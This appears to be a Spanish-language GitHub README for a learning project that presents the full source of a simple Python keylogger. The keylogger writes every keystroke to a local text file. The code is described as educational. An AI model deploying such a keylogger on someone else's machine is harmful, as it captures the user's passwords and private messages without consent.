<img align="center" src="https://media.licdn.com/dms/image/v2/D4D16AQGUNxQ7NSC05A/profile-displaybackgroundimage-shrink_350_1400/profile-displaybackgroundimage-shrink_350_1400/0/1738695150340?e=1749686400&v=beta&t=hBmszzzG0Zu-m7ZxeCdU5VxgDWqIZuWB0vnrMycuqY4" alt="gabriellugo" />

# KEYLOGGER

<a href="https://github.com/GabrielLugooo/Keylogger/blob/main/README%20Spanish.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Keylogger%20Español-000000" alt="Keylogger Español" /></a>
<a href="https://github.com/GabrielLugooo/WKeylogger" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Keylogger%20Inglés-green" alt="Keylogger Inglés" /></a>

### Objetivos

Este proyecto tiene como objetivo capturar las pulsaciones de teclas del usuario y almacenarlas en un archivo de texto. Se basa en la biblioteca `keyboard` de Python para registrar cada tecla presionada y guardarla en un archivo `data.txt` en tiempo real.

El keylogger es una herramienta útil para comprender el funcionamiento de la captura de eventos de teclado en Python, lo que permite su aplicación en áreas como seguridad informática, pruebas de software y accesibilidad.

### Habilidades Aprendidas

- Captura de eventos de teclado en Python.
- Uso de la biblioteca `keyboard`.
- Manejo de archivos en Python.
- Escritura y lectura de datos en archivos de texto.
- Automatización de procesos con eventos del sistema.

### Herramientas Usadas

![Static Badge](https://img.shields.io/badge/Python-000000?logo=python&logoSize=auto)
![Static Badge](https://img.shields.io/badge/keyboard-000000?logo=keyboard&logoSize=auto)

- Python
- Biblioteca `keyboard`

### Proyecto

#### Vista Previa

<img align="center" src="https://i.imgur.com/uEPMPfS.jpeg" alt="keylogger1" />
<img align="center" src="https://i.imgur.com/7bhqjLd.jpeg" alt="keylogger2" />

#### Código con Comentarios (Español)

```python
# Keylogger

# Instalar la librería necesaria con: pip install keyboard
# Importar la librería para detectar las pulsaciones de teclas
import keyboard

# Función que se ejecuta cada vez que se presiona una tecla
def pressedKeys(key):
    # Abrir (o crear) el archivo 'data.txt' en modo de adición ('a')
    with open('data.txt', 'a') as file:
        # Si la tecla presionada es la barra espaciadora, agregar un espacio en el archivo
        if key.name == 'space':
            file.write(' ')
        else:
            # Agregar el nombre de la tecla presionada al archivo
            file.write(key.name)

# Asignar la función pressedKeys para ejecutarse en cada pulsación de tecla
keyboard.on_press(pressedKeys)

# Mantener el programa en ejecución esperando eventos de teclado
keyboard.wait()
```

### Limitaciones

El Keylogger es solo para fines educativos bajo la licencia MIT.

---

<h3 align="left">Conecta Conmigo</h3>

<p align="left">
<a href="https://www.youtube.com/@gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=55200&format=png" alt="@gabriellugooo" height="40" width="40" /></a>
<a href="http://www.tiktok.com/@gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=118638&format=png" alt="@gabriellugooo" height="40" width="40" /></a>
<a href="https://instagram.com/lugooogabriel" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=32309&format=png" alt="lugooogabriel" height="40" width="40" /></a>
<a href="https://twitter.com/gabriellugo__" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=phOKFKYpe00C&format=png" alt="gabriellugo__" height="40" width="40" /></a>
<a href="https://www.linkedin.com/in/hernando-gabriel-lugo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=50&id=8808&format=png" alt="hernando-gabriel-lugo" height="40" width="40" /></a>
<a href="https://github.com/GabrielLugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.icons8.com/?size=80&id=AngkmzgE6d3E&format=png" alt="gabriellugooo" height="34" width="34" /></a>
<a href="mailto:lugohernandogabriel@gmail.com"> <img align="center" src="https://img.icons8.com/?size=50&id=38036&format=png" alt="lugohernandogabriel@gmail.com" height="40" width="40" /></a>
<a href="https://linktr.ee/gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://simpleicons.org/icons/linktree.svg" alt="gabriellugooo" height="40" width="40" /></a>
</p>

<p align="left">
<a href="https://github.com/GabrielLugooo/GabrielLugooo/blob/main/Readme%20Spanish.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Versión%20Español-000000" alt="Versión Español" /></a>
<a href="https://github.com/GabrielLugooo/GabrielLugooo/blob/main/README.md" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Versión%20Inglés-Green" alt="Versión Inglés" /></a>

</p>

<a href="https://linktr.ee/gabriellugooo" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/Créditos-Gabriel%20Lugo-green" alt="Créditos" /></a>
<img align="center" src="https://komarev.com/ghpvc/?username=GabrielLugoo&label=Vistas%20del%20Perfil&color=green&base=2000" alt="GabrielLugooo" />
<a href="" target="_blank" rel="noreferrer noopener"> <img align="center" src="https://img.shields.io/badge/License-MIT-green" alt="MIT License" /></a>
